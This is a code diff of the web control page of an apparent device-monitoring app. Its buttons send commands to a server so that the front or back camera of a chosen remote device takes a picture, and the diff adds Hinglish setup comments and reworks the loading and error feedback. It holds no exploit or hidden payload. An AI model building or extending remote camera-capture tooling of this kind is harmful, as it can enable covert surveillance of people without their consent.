@@ -24,7 +24,7 @@
             min-height: 100vh;
         }
 
-        /* --- HEADER (New Back Button Style) --- */
+        /* --- HEADER (Back Button Style) --- */
         .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 30px; }
         .back-btn {
             background: var(--glass-bg); border: 1px solid var(--glass-border);
@@ -95,14 +95,15 @@
     <div class="header">
         <a href="javascript:history.back()" class="back-btn"><i class="fa-solid fa-arrow-left"></i></a>
         <div class="page-title">Remote Capture</div>
-        <div style="width: 40px;"></div> </div>
+        <div style="width: 40px;"></div> 
+    </div>
 
     <div class="container">
         
         <div class="list-group">
             <div class="list-title">Camera Controls</div>
             
-            <div class="list-item" onclick="triggerCommand(this, 'capture_front')">
+            <div class="list-item" onclick="triggerCommand(this, 'camera_front')">
                 <div class="icon-box"><i class="fa-solid fa-user"></i></div>
                 <div class="text-content">
                     <div class="main-text">Front Camera</div>
@@ -112,7 +113,7 @@
                 <i class="fa-solid fa-chevron-right" style="color:#555; font-size: 0.8rem;"></i>
             </div>
 
-            <div class="list-item" onclick="triggerCommand(this, 'capture_back')">
+            <div class="list-item" onclick="triggerCommand(this, 'camera')">
                 <div class="icon-box"><i class="fa-solid fa-camera"></i></div>
                 <div class="text-content">
                     <div class="main-text">Back Camera</div>
@@ -144,34 +145,36 @@
     </div>
 
     <script>
-        const API_BASE = 'https://child-v9no.onrender.com'; 
+        // 🔥 IMPORTANT: Yahan apna server URL lagao (Localhost ya Cloud URL)
+        // Agar file directly khol rahe ho to: "http://localhost:3000"
+        // Agar server par host kar rahe ho to "/"
+        const API_BASE = "http://localhost:3000"; 
         
         // 1. SECURITY CHECK: ID Validation
-        // URL se ID lo, agar wahan nahi hai to LocalStorage check karo
         const urlParams = new URLSearchParams(window.location.search);
         let DEVICE_ID = urlParams.get('id');
 
-        // Agar URL me ID nahi hai, to storage check karo
         if (!DEVICE_ID) {
             DEVICE_ID = localStorage.getItem('monitoring_id');
         }
 
-        // Agar abhi bhi ID nahi mili, matlab unauthorized access hai -> Login pe bhejo
         if (!DEVICE_ID) {
-            alert("Unauthorized Access! Device ID not found.");
-            window.location.href = 'index.html'; // Wapas login page par
+            alert("⚠️ Device ID Missing! Please select a device first.");
+            window.location.href = 'index.html'; 
         }
 
-        // Logic to Trigger Command
+        // 2. TRIGGER COMMAND FUNCTION
         function triggerCommand(element, command) {
             const spinner = element.querySelector('.spinner');
             const arrow = element.querySelector('.fa-chevron-right');
             
-            // Show Loading
+            // UI Feedback (Loading Start)
             spinner.style.display = "block";
             if(arrow) arrow.style.display = "none";
             element.style.opacity = "0.7";
-            element.style.pointerEvents = "none"; // Prevent double clicking
+            element.style.pointerEvents = "none"; // Button disable during loading
+
+            console.log(`Sending command: ${command} to Device: ${DEVICE_ID}`);
 
             // Send Command to Server
             fetch(`${API_BASE}/api/send-command`, {
@@ -182,19 +185,23 @@
             .then(res => res.json())
             .then(data => {
                 setTimeout(() => {
-                    // Reset UI
+                    // UI Reset (Loading Stop)
                     spinner.style.display = "none";
                     if(arrow) arrow.style.display = "block";
                     element.style.opacity = "1";
                     element.style.pointerEvents = "auto";
                     
-                    // Simple Toast Alert
-                    // alert("Command Sent Successfully!");
-                }, 1000);
+                    if(data.status === "success") {
+                        // Success Feedback (Optional vibration)
+                        if(navigator.vibrate) navigator.vibrate(50);
+                    } else {
+                        alert("Error sending command!");
+                    }
+                }, 800);
             })
             .catch(err => {
-                console.error("Error:", err);
-                alert("Failed to send command. Device might be offline.");
+                console.error("Connection Error:", err);
+                alert("❌ Server Unreachable! Check if Node.js server is running.");
                 
                 spinner.style.display = "none";
                 if(arrow) arrow.style.display = "block";
